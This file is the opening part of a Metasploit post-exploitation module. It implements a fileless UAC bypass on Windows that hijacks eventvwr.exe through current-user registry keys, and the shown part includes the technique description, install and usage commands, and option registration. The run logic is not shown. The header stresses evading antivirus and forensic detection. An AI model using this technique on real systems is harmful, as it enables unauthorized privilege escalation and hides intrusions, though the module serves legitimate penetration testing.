##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Exploit Title  : enigma_fileless_uac_bypass.rb
# Module Author  : pedr0 Ubuntu [r00t-3xp10it]
# Vuln discover  : enigma0x3 | mattifestation
# Tested on      : Windows 7 | Windows 8 | Windows 10
# POC: https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
#
#
# [ DESCRIPTION ]
# Most of the UAC bypass techniques require dropping a file to disk (for example, placing a DLL on disk
# to perform a DLL hijack). The technique used in this module differs from the other public methods and
# provides a useful new technique that does not rely on a privileged file copy, code injection, or placing
# a traditional file on disk.
#
# As a normal user, you have write access to keys in HKCU, if an elevated process interacts with keys you
# are able to manipulate you can potentially interfere with actions a high-integrity process is attempting
# to perform. (hijack the process being started), Due to the fact that I was able to hijack the process,
# it is possible to simply execute whatever malicious cmd.exe command you wish. This means that code execution
# has been achieved in a high integrity process (bypassing UAC) without dropping a DLL or other file down to
# the file system. This significantly reduces the risk to the attacker because they aren’t placing a traditional
# file on the file system that can be caught by AV/HIPS or forensically identified later.
# "This module differs from OJ msf module because it uses cmd.exe insted of powershell.exe"
#
#
#
#
# [ MODULE DEFAULT OPTIONS ]
# The session number to run this module on  => set SESSION 3
# The cmd.exe command to be executed        => set CMD_COMMAND cmd.exe /c start notepad.exe
# Delete malicious registry key hive?       => set DEL_REGKEY true
#
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/escalate/enigma_fileless_uac_bypass.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/escalate/enigma_fileless_uac_bypass.rb
# Manually Path Search: root@kali:~# locate modules/post/windows/escalate
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/windows/escalate/enigma_fileless_uac_bypass
# msf post(enigma_fileless_uac_bypass) > info
# msf post(enigma_fileless_uac_bypass) > show options
# msf post(enigma_fileless_uac_bypass) > show advanced options
# msf post(enigma_fileless_uac_bypass) > set [option(s)]
# msf post(enigma_fileless_uac_bypass) > exploit
##



# ----------------------------
# Module Dependencies/requires
# ----------------------------
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'



# ----------------------------------
# Metasploit Class name and includes
# ----------------------------------
class MetasploitModule < Msf::Post
      Rank = GreatRanking
 
         include Msf::Post::Common
         include Msf::Post::Windows::Priv
         include Msf::Post::Windows::Error



# -----------------------------------------
# Building Metasploit/Armitage info GUI/CLI
# -----------------------------------------
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'enigma fileless uac bypass [RCE]',
                        'Description'   => %q{
                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe insted of powershell.exe (OJ msf module). This module will create the required registry entry in the current user’s hive, set the default value to whatever you pass via the CMD_COMMAND parameter, and runs eventvwr.exe (hijacking the process being started to gain code execution).
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                        'Vuln dicover : enigma0x3 | Matt Graeber', # credits
                                ],
 
                        'Version'        => '$Revision: 1.0',
                        'DisclosureDate' => 'jan 2 2017',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false', # thats no need for privilege escalation..
                        'Targets'        =>
                                [
                                         # Tested againts windows 7 | Windows 8 | Windows 10
                                         [ 'Windows XP', 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '6', # default its to run againts windows 10
                        'References'     =>
                                [
                                         [ 'URL', 'goo.gl/XHQ6aF' ],
                                         [ 'URL', 'http://sourceforge.net/users/peterubuntu10' ],
                                         [ 'URL', 'http://sourceforge.net/projects/msf-auxiliarys/repository' ]


                                ],
			'DefaultOptions' =>
				{
                                         'SESSION' => '1', # Default its to run againts session 1
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('CMD_COMMAND', [ false, 'The cmd command to be executed (eg cmd.exe /c <command>)']),
                                OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry key hive?' , false])
                        ], self.class)

        end


